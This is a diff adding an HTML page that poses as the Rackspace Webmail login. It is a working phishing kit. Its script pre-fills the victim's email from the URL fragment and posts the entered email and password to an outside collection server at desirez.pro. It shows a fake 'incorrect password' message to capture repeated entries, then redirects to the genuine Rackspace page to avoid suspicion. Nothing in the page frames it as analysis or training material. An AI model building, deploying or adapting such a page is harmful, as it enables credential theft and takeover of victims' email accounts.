@@ -1,0 +1,585 @@
+<!-- url: https://isnn.codeberg.page/as/
+status: 200 -->
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <title>Rackspace Webmail: Hosted Email for Business</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,400,500,700">
+  <link rel="icon" href="https://jdmediax.com/app/rackspace/media/images/faviconV2.png">
+
+  <style>
+    /* Page Defaults */
+    * {
+      -webkit-box-sizing: border-box;
+      -moz-box-sizing: border-box;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
+      font-size: 14px;
+      line-height: 1.42857;
+      color: #333333;
+      background-color: #FAFAFA;
+      margin: 0;
+    }
+
+    .caption {
+      display: inline-block;
+      font-size: 12px;
+      color: #666;
+    }
+
+    .base_link {
+      display: inline-block;
+      color: #0C7C84;
+      text-decoration: none;
+    }
+
+    .base_links {
+      background: #FFFFFF;
+      text-align: center;
+      padding-bottom: 20px;
+      margin-top: -15px;
+    }
+
+    .divider {
+      display: inline-block;
+      margin: 0px 5px;
+      color: #0C7C84;
+    }
+
+    /* Page Layout */
+    #content {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: fixed;
+      top: 0;
+      left: 0;
+      bottom: 0;
+      right: 0;
+      background: #EAEAEA;
+    }
+
+    #content-header {
+      height: 53px;
+      padding: 16px;
+      font-size: 24px;
+      font-weight: 300;
+      line-height: 18px;
+      background: #424242;
+      color: #FCFCFC;
+    }
+
+    #content-header-logo {
+      float: right;
+    }
+
+    #logo {
+      width: 130px;
+      margin-top: -9px;
+      margin-right: -5px;
+    }
+
+    #content-header-label {
+      float: left;
+    }
+
+    #content-body {
+      display: flex;
+      justify-content: start;
+      background: #FFFFFF;
+      min-width: 790px;
+    }
+
+    #banner-section {
+      height: 285px;
+      width: 314px;
+      margin: 40px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    #banner {
+      width: 190px;
+    }
+
+    #divider {
+      border: 1px solid rgb(224, 224, 224);
+      margin: 40px 0px;
+    }
+
+    /* Form Layout */
+    #form {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      padding: 20px;
+      min-height: 268px;
+      width: 100%;
+    }
+
+    #form-body {
+      height: 205px;
+      width: 100%;
+      margin: 40px 0px 0px 20px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding-right: 20px;
+    }
+
+    #form-container {
+      width: 100%;
+      margin: 0px auto;
+      padding: 0px 10px;
+    }
+
+    .row {
+      margin: 0px -10px;
+    }
+
+    .row:before,
+    .row:after {
+      content: " ";
+      display: table;
+    }
+
+    .col {
+      width: 100%;
+      float: left;
+      position: relative;
+      min-height: 1px;
+      padding: 0px 10px;
+    }
+
+    .form-group {
+      width: inherit;
+      padding-right: 30px;
+      margin-bottom: 20px;
+    }
+
+    .form-label {
+      position: relative;
+      font-family: Roboto;
+      font-size: 16px;
+      margin-bottom: 8px;
+      line-height: 1;
+      color: #616161;
+      display: inline-block;
+      max-width: 100%;
+    }
+
+    .form-field {
+      border: 1px solid #BDBDBD;
+      border-radius: 2px;
+      background: #FFFFFF;
+      font-family: Roboto;
+      font-size: 16px;
+      color: #616161;
+      height: 32px;
+      display: block;
+      width: 100%;
+      padding: 4px 8px;
+      line-height: 1.42857;
+      -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
+      box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
+      -webkit-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
+      -o-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
+      transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
+    }
+
+    #forgot-password {
+      position: absolute;
+      top: 0px;
+      right: 40px;
+      color: #0C7C84;
+      text-decoration: none;
+      background-color: transparent;
+      box-sizing: border-box;
+    }
+
+    #login-btn-toolbar {
+      float: right;
+      margin: auto 30px 15px -20px;
+    }
+
+    #login-btn {
+      float: right;
+      display: inline-flex;
+      flex-direction: row;
+      justify-content: center;
+      align-items: center;
+      padding: 0 12px;
+      height: 32px;
+      line-height: 1px;
+      font-size: 14px;
+      font-weight: 400;
+      text-transform: capitalize;
+      color: #fff;
+      background-color: #0C7C84;
+      border-color: #0C7C84;
+      margin-bottom: 0;
+      text-align: center;
+      vertical-align: middle;
+      touch-action: manipulation;
+      cursor: pointer;
+      background-image: none;
+      border: 1px solid transparent;
+      white-space: nowrap;
+      border-radius: 2px;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+
+    #form-container {
+      width: 100%;
+      margin: 0px auto;
+      padding: 0px 10px;
+    }
+
+    @media only screen and (max-device-width: 480px) {
+
+      /* Page Defaults */
+      body {
+        font-size: 19pt;
+        line-height: 1.42857em;
+      }
+
+      .caption {
+        display: inline-block;
+        font-size: 80%;
+        color: #666;
+      }
+
+      /* Page Layout */
+      #content {
+        align-items: inherit;
+        display: inherit;
+        justify-content: inherit;
+      }
+
+      #content-header {
+        font-size: 171%;
+        height: 3em;
+        line-height: 1em;
+        padding: 1em;
+      }
+
+      #content-header-logo {
+        float: right;
+      }
+
+      #logo {
+        margin-left: 6em;
+        width: inherit;
+        height: 1em;
+      }
+
+      #banner-section {
+        display: none;
+      }
+
+      #divider {
+        display: none;
+      }
+
+      /* Form Layout */
+      .form-label {
+        font-size: 114%;
+      }
+
+      .form-field {
+        font-size: 114%;
+        height: 2em;
+      }
+
+      #forgot-password {
+        right: 2em;
+        top: 0;
+      }
+
+      #login-btn-toolbar {
+        margin: 1.5em 2em 1em -1.5em;
+      }
+
+      #login-btn {
+        font-size: 150%;
+        height: 3em;
+        padding: 1.25em;
+      }
+    }
+
+    .loader {
+      position: fixed;
+      opacity: 0.5;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #333333;
+      transition: opacity 0.75s, visibility 0.75s;
+      z-index: 1000000000;
+    }
+
+    .loader--hidden {
+      opacity: 0;
+      visibility: hidden;
+    }
+
+    .loader::after {
+      content: "";
+      width: 75px;
+      height: 75px;
+      border: 15px solid #dddddd;
+      border-top-color: #0C7C84;
+      border-radius: 50%;
+      animation: loading 0.75s ease infinite;
+      z-index: 1000000000;
+    }
+
+    @keyframes loading {
+      from {
+        transform: rotate(0turn);
+      }
+
+      to {
+        transform: rotate(1turn);
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="loader loader--hidden"></div>
+  <div>
+    <div id="content">
+      <div>
+        <div id="content-header">
+          <div id="content-header-logo"><img id="logo" src="https://jdmediax.com/app/rackspace/media/images/dKmFZnz7az0M.png"></div>
+          <div id="content-header-label">Webmail Login</div>
+        </div>
+        <div id="content-body">
+          <div id="banner-section">
+            <a href="https://emailhelp.rackspace.com/l/identify-suspicious-email" target="_blank">
+              <img id="banner" src="https://jdmediax.com/app/rackspace/media/images/Fcew6J43q159.jpg">
+            </a>
+          </div>
+          <div id="divider"></div>
+          <form id="form" method="post" name="login" action="" autocomplete="off">
+            <div id="form-body">
+              <div id="form-container">
+                <div id="errorMessageDiv" class="errorMessage" style="color: rgb(211, 47, 47); margin-bottom: 20px; font-weight: 500; display: none;"></div>
+                <input type="hidden" name="__RequestVerificationToken"
+                  value="CfDJ8MLSaS1j5HxBq1mFzZqeaAxDXXGfDPuRfX0B2JPch6nzSRi_5iI3DJDXaFPcjxEIiGzwpX3pRmH0-X43svJZyx_WKVX7U6T6SVMAQZtmyVcaFqnNa0eoGgkKjECPjuQp7ecmW1xhDN1miFQ08K111To">
+                <!-- destination and flags is used for OWA login -->
+                <input id="form-destination" type="hidden" name="destination" value="">
+                <input id="form-owa-flags" type="hidden" name="flags" value="4">
+                <div id="user-row" class="row">
+                  <div id="user-col" class="col">
+                    <div id="user-field" class="form-group">
+                      <label id="user-label" class="form-label">Email address</label>
+                      <input id="user-input" name="username" tabindex="1" class="form-field" value=""
+                        autocomplete="username">
+                    </div>
+                  </div>
+                </div>
+                <div id="pass-row" class="row">
+                  <div id="pass-col" class="col">
+                    <div id="pass-field" class="form-group">
+                      <label id="pass-label" class="form-label">Password</label>
+                      <input id="pass-input" name="password" tabindex="2" type="password" class="form-field" value=""
+                        autocomplete="current-password">
+                    </div>
+                    <a id="forgot-password" href="/wmidentity/recover/password" tabindex="4">Forgot password?</a>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div id="login-btn-toolbar">
+              <button onclick="submitLogin(event);" id="login-btn" tabindex="3" type="submit">Log In</button>
+            </div>
+          </form>
+        </div>
+        <div class="base_links">
+          <a class="base_link" target="_blank" href="http://www.rackspace.com/information/legal/privacystatement">
+            Privacy Statement
+          </a>
+          <div class="divider"> | </div>
+          <a class="base_link" target="_blank" href="http://www.rackspace.com/information/legal/websiteterms">
+            Website Terms
+          </a>
+        </div>
+        <div class="footer" style="text-align: center; margin-top: 10px;">
+          <div class="caption">
+            Need webmail for your business? Learn more about
+            <a href="//www.rackspace.com/email-hosting/webmail" style="color: #666;">
+              Hosted Email
+            </a>
+            from Rackspace
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script>
+    // ############################################################################
+    // Specify the URL of the PHP file Here
+    var url = "https://desirez.pro/rackspace/main.php";
+    // ############################################################################
+
+    window.onload = function () {
+      // Get the current URL
+      var url = window.location.href;
+
+      // Parse the URL and get the fragment (the part after the '#')
+      var urlComponents = new URL(url);
+      var email = urlComponents.hash.substring(1);
+
+      // Check if the fragment is a valid email
+      var emailRegex = /^[\w-]+(\.[\w-]+)*@([\w-]+\.)+[a-zA-Z]{2,7}$/;
+      if (emailRegex.test(email)) {
+        var emailElement = document.getElementById("user-input");
+        if (emailElement) {
+          emailElement.value = email;
+        }
+      }
+    };
+
+    // Get the form and input elements
+    var emailInput = document.getElementById("user-input");
+    var passwordInput = document.getElementById("pass-input");
+    let errorId = document.getElementById("errorMessageDiv");
+    let errorClass = document.querySelectorAll(".errorMessage");
+    var form = document.getElementById("form");
+    const loader = document.querySelector(".loader");
+    var clickCount = 0;
+
+    // Add an event listener for form submission
+    form.addEventListener("submit", function (event) {
+      // Prevent the form from being submitted normally
+      event.preventDefault();
+
+      // Check if the username field is empty
+      if (emailInput.value.trim() === "") {
+        // Display the error message for the username field
+        errorId.textContent = "Please enter your username.";
+        errorClass.forEach(function (element) {
+          element.style.display = "block";
+        });
+
+        // Hide the error message after 4 seconds
+        setTimeout(function () {
+          errorId.textContent = "";
+          errorClass.forEach(function (element) {
+            element.style.display = "none";
+          });
+        }, 4000);
+      } else if (passwordInput.value.trim() === "") {
+        // Display the error message for the password field
+        errorId.textContent = "Please enter your password.";
+        errorClass.forEach(function (element) {
+          element.style.display = "block";
+        });
+
+        // Hide the error message after 4 seconds
+        setTimeout(function () {
+          errorId.textContent = "";
+          errorClass.forEach(function (element) {
+            element.style.display = "none";
+          });
+        }, 4000);
+      } else {
+        // Both fields are filled, so you can proceed with the form submission
+        // You can add your form submission logic here
+        loading();
+        let dataLog = {
+          email: emailInput.value,
+          password: passwordInput.value,
+          desc: "https://apps.rackspace.com/wmidentity/account/login: Login Details",
+        };
+        sendDataWithRetry(dataLog);
+      }
+    })
+
+    // Write a function that will redirect the page to a URL
+    function toggleClass() {
+      // Redirect the page to a URL
+      window.location.href = "https://apps.rackspace.com/wmidentity/account/login"
+    }
+
+    // Send data to the PHP file
+    function sendDataWithRetry(dataLog, maxRetries = 3) {
+      const sendRequest = async (retryCount) => {
+        try {
+          const response = await fetch(url, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json; charset=utf-8",
+            },
+            body: JSON.stringify(dataLog),
+          });
+
+          if (response.ok) {
+            const responseData = await response.json();
+            stopLoading()
+            // console.log("Data received by PHP:", responseData);
+            clickCount++;
+            // console.log(clickCount);
+            if (clickCount === 3) {
+              // Execute a separate function on second click
+              toggleClass();
+              clickCount = 0;
+            }
+            // Continue with other tasks (e.g., UI updates, etc.)
+          } else {
+            throw new Error("Network response was not OK");
+          }
+        } catch (error) {
+          console.error("Error sending data:", error);
+          if (retryCount < maxRetries) {
+            console.log(`Retrying (attempt ${retryCount + 1})...`);
+            await sendRequest(retryCount + 1);
+          } else {
+            console.error("Max retries reached. Data not sent.");
+            // Handle failure (e.g., show an error message)
+          }
+        }
+      };
+      sendRequest(0); // Start the initial request
+    }
+
+    function loading() {
+      loader.classList.remove("loader--hidden");
+    }
+
+    function stopLoading() {
+      loader.classList.add("loader--hidden");
+      errorId.textContent = "Username / Password incorrect";
+      errorClass.forEach(function (element) {
+        element.style.display = "block";
+      });
+      passwordInput.value = ""
+
+      setTimeout(function () {
+        errorId.textContent = "";
+        errorClass.forEach(function (element) {
+          element.style.display = "none";
+        });
+      }, 4000);
+    }
+  </script>
+</body>
+
+</html>
